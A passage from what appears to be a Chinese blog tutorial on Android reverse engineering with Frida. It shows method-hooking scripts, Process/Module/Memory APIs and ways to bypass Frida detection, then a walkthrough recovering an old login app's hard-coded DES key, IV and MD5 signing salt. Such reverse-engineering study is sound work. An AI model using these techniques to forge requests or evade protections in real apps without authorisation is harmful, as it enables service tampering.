class="type">var</span> <span class="variable">methods</span> <span class="operator">=</span>Demo.class.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j &lt; methods.length; j++)&#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">methodName</span> <span class="operator">=</span> methods[j].getName();</span><br><span class="line">            console.log(methodName);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k=<span class="number">0</span>; k&lt;Demo[methodName].overloads.length;k++)&#123;</span><br><span class="line">                Demo[methodName].overloads[k].implementation = function()&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arguments.length;i++)&#123;</span><br><span class="line">                        console.log(arguments[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>[methodName].apply(<span class="built_in">this</span>,arguments);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ClassName=Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>); </span><br><span class="line">ClassName.privateFunc(<span class="string">&quot;传参&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    Java.choose(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>,&#123;    <span class="comment">//要hook的类</span></span><br><span class="line">        onMatch:function(instance)&#123;</span><br><span class="line">            ret=instance.privateFunc(<span class="string">&quot;aaaaaaa&quot;</span>); <span class="comment">//要hook的方法</span></span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete:function()&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//return ret;</span></span><br></pre></td></tr></table></figure><h3 id="Process、Module、Memory基础"><a href="#Process、Module、Memory基础" class="headerlink" title="Process、Module、Memory基础"></a>Process、Module、Memory基础</h3><h4 id="1-Process"><a href="#1-Process" class="headerlink" title="1.Process"></a>1.Process</h4><p><code>Process</code> 对象代表当前被Hook的进程，能获取进程的信息，枚举模块，枚举范围等</p><table><thead><tr><th align="left">API</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>Process.id</code></td><td align="left">返回附加目标进程的 <code>PID</code></td></tr><tr><td align="left"><code>Process.isDebuggerAttached()</code></td><td align="left">检测当前是否对目标程序已经附加</td></tr><tr><td align="left"><code>Process.enumerateModules()</code></td><td align="left">枚举当前加载的模块，返回模块对象的数组</td></tr><tr><td align="left"><code>Process.enumerateThreads()</code></td><td align="left">枚举当前所有的线程，返回包含 <code>id</code>, <code>state</code>, <code>context</code> 等属性的对象数组</td></tr></tbody></table><h4 id="2-Module"><a href="#2-Module" class="headerlink" title="2.Module"></a>2.Module</h4><p><code>Module</code> 对象代表一个加载到进程的模块(例如，在 Windows 上的 DLL，或在 Linux&#x2F;Android 上的 .so 文件),能查询模块的信息，如模块的基址、名称、导入&#x2F;导出的函数等</p><table><thead><tr><th align="left">API</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>Module.load()</code></td><td align="left">加载指定so文件，返回一个Module对象</td></tr><tr><td align="left"><code>enumerateImports()</code></td><td align="left">枚举所有Import库函数，返回Module数组对象</td></tr><tr><td align="left"><code>enumerateExports()</code></td><td align="left">枚举所有Export库函数，返回Module数组对象</td></tr><tr><td align="left"><code>enumerateSymbols()</code></td><td align="left">枚举所有Symbol库函数，返回Module数组对象</td></tr><tr><td align="left"><code>Module.findExportByName(exportName)、Module.getExportByName(exportName)</code></td><td align="left">寻找指定so中export库中的函数地址</td></tr><tr><td align="left"><code>Module.findBaseAddress(name)、Module.getBaseAddress(name)</code></td><td align="left">返回so的基地址</td></tr></tbody></table><h4 id="3-Memory"><a href="#3-Memory" class="headerlink" title="3.Memory"></a>3.Memory</h4><p><code>Memory</code>是一个工具对象，提供直接读取和修改进程内存的功能，能够读取特定地址的值、写入数据、分配内存等</p><table><thead><tr><th align="left">方法</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left"><code>Memory.copy()</code></td><td align="left">复制内存</td></tr><tr><td align="left"><code>Memory.scan()</code></td><td align="left">搜索内存中特定模式的数据</td></tr><tr><td align="left"><code>Memory.scanSync()</code></td><td align="left">同上，但返回多个匹配的数据</td></tr><tr><td align="left"><code>Memory.alloc()</code></td><td align="left">在目标进程的堆上申请指定大小的内存，返回一个<code>NativePointer</code></td></tr><tr><td align="left"><code>Memory.writeByteArray()</code></td><td align="left">将字节数组写入一个指定内存</td></tr><tr><td align="left"><code>Memory.readByteArray()</code></td><td align="left">读取内存</td></tr></tbody></table><h3 id="Frida检测"><a href="#Frida检测" class="headerlink" title="Frida检测"></a>Frida检测</h3><ol><li>检测<code>/data/local/tmp</code>路径下的是否有frida特征文件（重命名文件）</li><li>检测maps（<code>hook strstr/strcmp</code>函数）&#x2F;（重定向<code>maps</code>文件）&#x2F;（用eBPF来hook系统调用并修改参数实现目的，使用<code>bpf_probe_write_user</code>向用户态函数地址写内容直接修改参数）</li><li>检测status(线程名)（<code>hook strstr strcmp</code>函数）</li><li>检测inlinehook（<code>hook memcmp</code>函数）</li></ol><blockquote><p>实际的hook还需要去逆向对应的frida检测代码，然后做出相应的change</p></blockquote><p>也可以刷入魔改后的frida-server客户端</p><p><a href="https://github.com/hzzheyang/strongR-frida-android?tab=readme-ov-file">https://github.com/hzzheyang/strongR-frida-android?tab=readme-ov-file</a></p><p><a href="https://github.com/Ylarod/Florida">https://github.com/Ylarod/Florida</a></p><h2 id="App1"><a href="#App1" class="headerlink" title="App1"></a>App1</h2><p>一个登录界面，尝试登录请求抓包：</p><p>账号：<code>1234567890</code> 密码：<code>123456789</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/login HTTP/1.1</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel Build/PQ2A.190405.003)</span><br><span class="line">Host: api.dodovip.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 262</span><br><span class="line"></span><br><span class="line">&#123;&quot;Encrypt&quot;:&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\/\/FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT\/FXC+BMD\nbmIP0xrILxokBXoh7OoVgMbtuNMHBgOkhfune+JRPpa3O6XOpZbvNSV4zGRVpm6sKZ74RrRZvf5Y\nR1tTPSGZkERXdKPxddJZKfJiqwKHHMTk61D\/Z4zcZYYsTWqycwQ+ZGFjPIugKPjPFFzcf+vHE3CR\nGqsmzGc=\n&quot;&#125;</span><br></pre></td></tr></table></figure><p>但是返回了一个404的包，说明该接口已经被弃用了，只能纯逆向了（因为是一个非常老的apk了）</p><p>反编译apk然后分析算法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">private</span> Map para;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String userName, String pwd)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.DEFAULT_TYPE = <span class="keyword">new</span> <span class="title class_">TypeToken</span>() &#123;</span><br><span class="line">    &#125;.getType();</span><br><span class="line">    <span class="built_in">this</span>.para.clear();</span><br><span class="line">    <span class="built_in">this</span>.para.put(<span class="string">&quot;username&quot;</span>, userName);</span><br><span class="line">    <span class="built_in">this</span>.para.put(<span class="string">&quot;userPwd&quot;</span>, pwd);</span><br><span class="line">    <span class="keyword">if</span>(TextUtils.isEmpty(DodonewOnlineApplication.devId)) &#123;</span><br><span class="line">        DodonewOnlineApplication.devId = Utils.getDevId(DodonewOnlineApplication.getAppContext());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.para.put(<span class="string">&quot;equtype&quot;</span>, <span class="string">&quot;ANDROID&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.para.put(<span class="string">&quot;loginImei&quot;</span>, <span class="string">&quot;Android&quot;</span> + DodonewOnlineApplication.devId);</span><br><span class="line">    <span class="built_in">this</span>.requestNetwork(<span class="string">&quot;user/login&quot;</span>, <span class="built_in">this</span>.para, <span class="built_in">this</span>.DEFAULT_TYPE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将userName、pwd、equtype和loginImei打包成一个Map类型的值类似json，然后通过this.requestNetwork，传递给user&#x2F;login接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">requestNetwork</span><span class="params">(String cmd, Map para, Type type)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.showProgress();</span><br><span class="line">    <span class="built_in">this</span>.request = <span class="keyword">new</span> <span class="title class_">JsonRequest</span>(<span class="built_in">this</span>, <span class="string">&quot;http://api.dodovip.com/api/&quot;</span> + cmd, <span class="string">&quot;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Listener</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onResponse</span><span class="params">(RequestResult requestResult)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(!requestResult.code.equals(<span class="string">&quot;1&quot;</span>)) &#123;</span><br><span class="line">                LoginActivity.<span class="built_in">this</span>.showToast(requestResult.message);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(cmd.equals(<span class="string">&quot;user/login&quot;</span>)) &#123;</span><br><span class="line">                DodonewOnlineApplication.loginUser = (User)requestResult.data;</span><br><span class="line">                DodonewOnlineApplication.loginLabel = <span class="string">&quot;mobile&quot;</span>;</span><br><span class="line">                Utils.saveJson(LoginActivity.<span class="built_in">this</span>, DodonewOnlineApplication.loginLabel, <span class="string">&quot;LOGINLABEL&quot;</span>);</span><br><span class="line">                LoginActivity.<span class="built_in">this</span>.intentMainActivity();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            LoginActivity.<span class="built_in">this</span>.dissProgress();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, <span class="built_in">this</span>, type);</span><br><span class="line">    <span class="built_in">this</span>.request.addRequestMap(para, <span class="number">0</span>);</span><br><span class="line">    DodonewOnlineApplication.addRequest(<span class="built_in">this</span>.request, <span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建JsonRequest对象，构造完整API URL为<code>http://api.dodovip.com/api/ + cmd</code></li><li>设置响应监听器(Listener)处理请求结果</li><li>通过addRequestMap方法将参数(para)添加到请求中</li><li>最后通过DodonewOnlineApplication.addRequest将请求添加到队列中执行</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addRequestMap</span><span class="params">(Map map0, <span class="type">int</span> a)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> System.currentTimeMillis() + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(map0 == <span class="literal">null</span>) &#123;</span><br><span class="line">        map0 = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    map0.put(<span class="string">&quot;timeStamp&quot;</span>, s);</span><br><span class="line">    <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> RequestUtil.encodeDesMap(RequestUtil.paraMap(map0, <span class="string">&quot;sdlkjsdljf0j2fsjk&quot;</span>, <span class="string">&quot;sign&quot;</span>), <span class="built_in">this</span>.desKey, <span class="built_in">this</span>.desIV);</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj.put(<span class="string">&quot;Encrypt&quot;</span>, s1);</span><br><span class="line">        <span class="built_in">this</span>.mRequestBody = obj + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(JSONException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到再次加入一个<code>timeStamp</code>参数，然后通过Des加密就成了<code>Encrypt</code>的<code>value</code>了，可以看到我们请求包中的参数的<code>key</code>就是<code>Encrypt</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> RequestUtil.encodeDesMap(RequestUtil.paraMap(map0, <span class="string">&quot;sdlkjsdljf0j2fsjk&quot;</span>, <span class="string">&quot;sign&quot;</span>), <span class="built_in">this</span>.desKey, <span class="built_in">this</span>.desIV);</span><br></pre></td></tr></table></figure><p>这里可以通过frida hook来获取这三个参数的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">RequestUtil</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.dodonew.online.http.RequestUtil&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">RequestUtil</span>);</span><br><span class="line">    <span class="title class_">RequestUtil</span>.<span class="property">encodeDesMap</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a,b,c</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data: &quot;</span>+a);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desKey: &quot;</span>+b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desIV: &quot;</span>+c);</span><br><span class="line">        <span class="keyword">var</span> returnValue = <span class="variable language_">this</span>.<span class="title function_">encodeDesMap</span>(a,b,c);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;returnValue: &quot;</span>+returnValue);</span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Pixel::PID::18572 ]-&gt; data: &#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;D890E5736DE831FE31CFEAB80EA79808&quot;,&quot;timeStamp&quot;:&quot;1759499341310&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;</span><br><span class="line">desKey: 65102933</span><br><span class="line">desIV: 32028092</span><br><span class="line">returnValue: NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT/FXC+BMD</span><br><span class="line">bmIP0xrILw+btCAOv/RTB58iDYS9BneDRhHyJkzHZpgn+2fSdkhXpYri+OFeZ+MGhIR+Vqny4/K5</span><br><span class="line">nBpbSsQk3dnxQYVkLC64nN947cLFIUOcvnABk93q8ih6kqT53Hj0yxQbl3ksduKCO4P/pZPpQzAG</span><br><span class="line">6DUPk6s=</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;D890E5736DE831FE31CFEAB80EA79808&quot;,&quot;timeStamp&quot;:&quot;1759499341310&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;</span><br></pre></td></tr></table></figure><p>这是<code>RequestUtil.paraMap(map0, &quot;sdlkjsdljf0j2fsjk&quot;, &quot;sign&quot;)</code>的返回值，然后Key和IV是硬编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /api/user/login HTTP/1.1</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">User-Agent: Dalvik/2.1.0 (Linux; U; Android 9; Pixel Build/PQ2A.190405.003)</span><br><span class="line">Host: api.dodovip.com</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 264</span><br><span class="line"></span><br><span class="line">&#123;&quot;Encrypt&quot;:&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\/\/FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT\/FXC+BMD\nbmIP0xrILw+btCAOv\/RTB58iDYS9BneDRhHyJkzHZpgn+2fSdkhXpYri+OFeZ+MGhIR+Vqny4\/K5\nnBpbSsQk3dnxQYVkLC64nN947cLFIUOcvnABk93q8ih6kqT53Hj0yxQbl3ksduKCO4P\/pZPpQzAG\n6DUPk6s=\n&quot;&#125;</span><br></pre></td></tr></table></figure><p>返回值和抓包得到<code>Encrypt</code>的value是一样的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;D890E5736DE831FE31CFEAB80EA79808&quot;,&quot;timeStamp&quot;:&quot;1759499341310&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;</span><br></pre></td></tr></table></figure><p><code>timeStamp</code>是时间戳，通过<code>String s = System.currentTimeMillis() + &quot;&quot;;</code>获取</p><p>其他字段都是明文，重点看<code>sign</code>字段是如何得到的</p><p>Hook<code>paraMap</code>函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">timeStamp : 1759500042670</span><br><span class="line">loginImei : Android352689080920725</span><br><span class="line">equtype : ANDROID</span><br><span class="line">userPwd : 12345678</span><br><span class="line">username : 12345678901</span><br></pre></td></tr></table></figure><p>map里的内容是以上的明文字段，因此sign是在当前函数产生的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">paraMap</span><span class="params">(Map map0, String append, String sign)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Set</span> <span class="variable">set0</span> <span class="operator">=</span> map0.keySet();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="keyword">for</span>(Object object0: set0) &#123;</span><br><span class="line">            list.add(((String)object0) + <span class="string">&quot;=&quot;</span> + ((String)map0.get(((String)object0))));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Collections.sort(list);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); ++i) &#123;</span><br><span class="line">            builder.append(((String)list.get(i)));</span><br><span class="line">            builder.append(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        builder.append(<span class="string">&quot;key=&quot;</span> + append);</span><br><span class="line">        map0.put(<span class="string">&quot;sign&quot;</span>, Utils.md5(builder.toString()).toUpperCase());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().toJson(RequestUtil.sortMapByKey(map0));</span><br><span class="line">        Log.w(<span class="string">&quot;yang&quot;</span>, s2 + <span class="string">&quot;   result&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> s2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从map0中获取所有的key，然后按照key&#x3D;value的格式放到一个list里，之后进行字典排序，然后用<code>&amp;</code>将每个键值对拼接起来，最后将其MD5就获得了<code>sign</code>，因此我们hook<code>md5</code>函数就能得到参数是什么了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5: equtype=ANDROID&amp;loginImei=Android352689080920725&amp;timeStamp=1759500651664&amp;userPwd=12345678 &amp;username=12345678901&amp;key=sdlkjsdljf0j2fsjk</span><br><span class="line">returnValue: 7514354356ba3ea708a5df7bcd139bbd</span><br><span class="line">returnValue: &#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352689080920725&quot;,&quot;sign&quot;:&quot;7514354356BA3EA708A5DF7BCD139BBD&quot;,&quot;timeStamp&quot;:&quot;1759500651664&quot;,&quot;userPwd&quot;:&quot;12345678 &quot;,&quot;username&quot;:&quot;12345678901&quot;&#125;</span><br></pre></td></tr></table></figure><p>可以看到是通过首字符升序排序的，<code>key</code>也是一个固定的值</p><p>然后详细看加密算法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encodeDesMap</span><span class="params">(String data, String desKey, String desIV)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DesSecurity</span>(desKey, desIV).encrypt64(data.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">DesSecurity</span><span class="params">(String key, String iv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span>(key == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Parameter is null!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.InitCipher(key.getBytes(), iv.getBytes());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">InitCipher</span><span class="params">(<span class="type">byte</span>[] secKey, <span class="type">byte</span>[] secIv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">MessageDigest</span> <span class="variable">messageDigest0</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">    messageDigest0.update(secKey);</span><br><span class="line">    <span class="type">DESKeySpec</span> <span class="variable">dsk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DESKeySpec</span>(messageDigest0.digest());</span><br><span class="line">    <span class="type">SecretKey</span> <span class="variable">secretKey0</span> <span class="operator">=</span> SecretKeyFactory.getInstance(<span class="string">&quot;DES&quot;</span>).generateSecret(dsk);</span><br><span class="line">    <span class="type">IvParameterSpec</span> <span class="variable">iv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(secIv);</span><br><span class="line">    <span class="built_in">this</span>.enCipher = Cipher.getInstance(<span class="string">&quot;DES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.deCipher = Cipher.getInstance(<span class="string">&quot;DES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.enCipher.init(<span class="number">1</span>, secretKey0, iv);</span><br><span class="line">    <span class="built_in">this</span>.deCipher.init(<span class="number">2</span>, secretKey0, iv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] decrypt64(String data) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.deCipher.doFinal(Base64.decode(data, <span class="number">0</span>));</span><br><span 